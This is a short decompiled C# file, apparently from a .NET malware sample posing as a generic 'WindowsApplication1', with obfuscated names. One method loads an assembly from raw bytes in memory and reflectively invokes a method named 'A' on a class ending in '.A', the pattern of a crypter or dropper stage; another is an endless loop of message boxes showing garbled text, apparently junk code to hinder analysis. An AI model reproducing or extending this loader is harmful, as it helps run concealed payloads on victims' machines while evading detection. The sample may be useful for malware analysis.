using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;

namespace WindowsApplication1;

internal class jK
{
	public static object Rm(byte[] AssemblyName)
	{
		Assembly assembly = Assembly.Load(AssemblyName);
		Type[] types = assembly.GetTypes();
		int num = 0;
		Type type;
		object result = default(object);
		while (true)
		{
			if (num < types.Length)
			{
				type = types[num];
				if (type.IsClass && type.FullName!.EndsWith(".A"))
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return result;
		}
		object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
		return RuntimeHelpers.GetObjectValue(type.InvokeMember("A", BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), new object[0]));
	}

	private object NWmHhYL79M411Zkw6()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			new decimal(71273L);
			int num = 3262062;
			do
			{
				Interaction.MsgBox((object)"W )~‡7QH\\F!sO€ŽLu'>LOL\u0090w0\u008dFA`G`‹\u0081,>\u008ddDkŒŽwCJJS‰,Qƒ/RbU5QdŠOwI@\u007fMSA~", (MsgBoxStyle)0, (object)null);
				num = checked(num + 1);
			}
			while (num <= 63317889);
		}
	}
}
